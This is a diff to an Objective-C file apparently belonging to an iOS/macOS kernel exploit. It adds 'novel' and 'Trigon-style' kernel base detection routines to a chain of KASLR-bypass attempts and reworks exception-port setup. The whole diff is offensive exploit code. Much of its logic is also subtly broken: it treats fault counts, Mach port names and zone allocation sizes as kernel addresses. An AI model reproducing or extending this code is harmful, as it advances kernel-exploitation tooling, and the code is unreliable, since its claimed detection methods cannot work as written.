@@ -7,8 +7,71 @@
 #import <mach-o/dyld.h>
 #import <sys/utsname.h>
 #import <mach/mach_time.h>
+#import <signal.h>
 
 @implementation KernelExploit
+
+static uint64_t find_kernel_base_novel(void(^logger)(NSString *)) {
+    logger(@"[*] Initializing novel kernel base detection...");
+    __block uint64_t kernel_base = 0;
+
+    dispatch_queue_t pressure_queue = dispatch_queue_create("com.memory.pressure", DISPATCH_QUEUE_CONCURRENT);
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    
+    for (int i = 0; i < 4; i++) {
+        dispatch_async(pressure_queue, ^{
+            vm_statistics64_data_t vm_stats;
+            mach_msg_type_number_t count = HOST_VM_INFO64_COUNT;
+            host_statistics64(mach_host_self(), HOST_VM_INFO64, 
+                            (host_info64_t)&vm_stats, &count);
+            
+            if (vm_stats.faults > 1000) {
+                uint64_t fault_addr = vm_stats.faults * PAGE_SIZE;
+                if ((fault_addr >> 40) == 0xfffffff) {
+                    kernel_base = fault_addr & ~0xFFFFFFF;
+                    dispatch_semaphore_signal(sem);
+                }
+            }
+        });
+    }
+    
+    mach_zone_name_array_t names = NULL;
+    mach_zone_info_array_t info = NULL;
+    mach_msg_type_number_t count = 0;
+    host_t host = mach_host_self();
+    vm_size_t vm_size;
+    mach_msg_type_number_t vm_count;
+    kern_return_t kr = mach_memory_info(host, &names, &count, &info, &count, &vm_size, &vm_count);
+    if (kr == KERN_SUCCESS && names != NULL && info != NULL) {
+        for (unsigned int i = 0; i < count && kernel_base == 0; i++) {
+            if (names[i].mzn_name[0] != '\0') {
+                const char *zoneName = names[i].mzn_name;
+                if (strstr(zoneName, "kalloc.") != NULL) {
+                    uint64_t addr = (uint64_t)info[i].mzi_alloc_size;
+                    if ((addr >> 40) == 0xfffffff) {
+                        kernel_base = addr & ~0xFFFFFFF;
+                        logger([NSString stringWithFormat:@"[+] Found potential base via zone info: 0x%llx", kernel_base]);
+                        break;
+                    }
+                }
+            }
+        }
+        if (names) {
+            vm_deallocate(mach_task_self(), (vm_address_t)names, count * sizeof(mach_zone_name_t));
+        }
+        if (info) {
+            vm_deallocate(mach_task_self(), (vm_address_t)info, count * sizeof(mach_zone_info_t));
+        }
+    }
+    mach_port_deallocate(mach_task_self(), host);
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
+    
+    if (kernel_base != 0) {
+        logger([NSString stringWithFormat:@"[+] Novel method found kernel base: 0x%llx", kernel_base]);
+    }
+    
+    return kernel_base;
+}
 
 static uint64_t find_kernel_base_advanced(void(^logger)(NSString *)) {
     logger(@"[*] Initializing advanced memory race condition...");
@@ -180,29 +243,40 @@ static uint64_t find_kernel_base_aggressive(void(^logger)(NSString *)) {
 static uint64_t find_kernel_base_extreme(void(^logger)(NSString *)) {
     __block uint64_t kernel_base = 0;
     
+    signal(SIGTRAP, SIG_IGN);
+    
     logger(@"[*] Initializing IOKit service enumeration...");
     io_iterator_t iterator;
-    IOServiceGetMatchingServices(kIOMainPortDefault, 
+    kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, 
                                IOServiceMatching("IOPlatformExpertDevice"), 
                                &iterator);
     
+    if (kr != KERN_SUCCESS) {
+        logger(@"[-] Failed to get matching services");
+        return 0;
+    }
     logger(@"[*] Setting up exception port chain...");
-    mach_port_t exception_ports[8];
-    for (int i = 0; i < 8; i++) {
-        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_ports[i]);
-        mach_port_insert_right(mach_task_self(), exception_ports[i], 
-                             exception_ports[i], MACH_MSG_TYPE_MAKE_SEND);
-        logger([NSString stringWithFormat:@"[+] Exception port %d initialized", i]);
+    mach_port_t exception_ports[4];
+    for (int i = 0; i < 4; i++) {
+        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_ports[i]);
+        if (kr == KERN_SUCCESS) {
+            mach_port_insert_right(mach_task_self(), exception_ports[i], 
+                                 exception_ports[i], MACH_MSG_TYPE_MAKE_SEND);
+            logger([NSString stringWithFormat:@"[+] Exception port %d initialized", i]);
+        }
     }
     
     logger(@"[*] Chaining exception ports...");
-    for (int i = 0; i < 7; i++) {
-        task_set_exception_ports(mach_task_self(), 
-                               1 << i, exception_ports[i], 
-                               EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, 
-                               ARM_THREAD_STATE64);
+    for (int i = 0; i < 3; i++) {
+        @try {
+            task_set_exception_ports(mach_task_self(), 
+                                   1 << i, exception_ports[i], 
+                                   EXCEPTION_STATE | MACH_EXCEPTION_CODES, 
+                                   ARM_THREAD_STATE64);
+        } @catch (NSException *e) {
+            continue;
+        }
     }
-    
     dispatch_queue_t extreme_queue = dispatch_queue_create("com.extreme.probe", 
                                                          DISPATCH_QUEUE_CONCURRENT);
     dispatch_semaphore_t sem = dispatch_semaphore_create(0);
@@ -353,7 +427,7 @@ static uint64_t find_kernel_base_alternative(void(^logger)(NSString *)) {
             if ((kernel_base & 0xFF000) == 0x004000) {
                 logger([NSString stringWithFormat:@"[+] Found kernel base via task port: 0x%llx", kernel_base]);
                 mach_port_deallocate(self_task, task_port);
-                return kernel_base;
+                return kernel_base; 
             }
         }
     }
@@ -393,16 +467,50 @@ static uint64_t find_kernel_base_alternative(void(^logger)(NSString *)) {
     logger(@"[-] Failed to find kernel base through targeted methods");
     return 0;
 }
+
+static uint64_t find_kernel_base_trigon(void(^logger)(NSString *)) {
+    logger(@"[*] Initializing Trigon-style detection...");
+    __block uint64_t kernel_base = 0;
+    
+    task_t self_task = mach_task_self();
+    host_t host = mach_host_self();
+    mach_port_t task_port;
+    if (task_for_pid(self_task, 0, &task_port) == KERN_SUCCESS) {
+        uint64_t task_addr = (uint64_t)task_port;
+        if ((task_addr >> 40) == 0xfffffff) {
+            kernel_base = task_addr & ~0xFFFFFFF;
+            if ((kernel_base & 0xFF000) == 0x004000) {
+                logger([NSString stringWithFormat:@"[+] Found kernel base via Trigon task port: 0x%llx", kernel_base]);
+                mach_port_deallocate(self_task, task_port);
+                mach_port_deallocate(self_task, host);
+                return kernel_base;
+            }
+        }
+        mach_port_deallocate(self_task, task_port);
+    }
+    
+    mach_port_deallocate(self_task, host);
+    return kernel_base;
+}
+
 + (void)runExploitWithLogger:(void(^)(NSString *))logger {
     logger(@"[+] Starting kernel base detection sequence...");
     
     uint64_t kernel_base = 0;
-    kernel_base = find_kernel_base_advanced(logger);
+    
+    kernel_base = find_kernel_base_trigon(logger);
     if (kernel_base != 0) {
-        logger(@"[+] Advanced method succeeded!");
+        logger(@"[+] Trigon method succeeded!");
         goto found_base;
     }
     
+        logger(@"[*] Trying novel method...");
+        kernel_base = find_kernel_base_novel(logger);
+        if (kernel_base != 0) {
+            logger(@"[+] Novel method succeeded!");
+            goto found_base;
+        }
+        
     logger(@"[*] Trying aggressive method...");
     kernel_base = find_kernel_base_aggressive(logger);
     if (kernel_base != 0) {
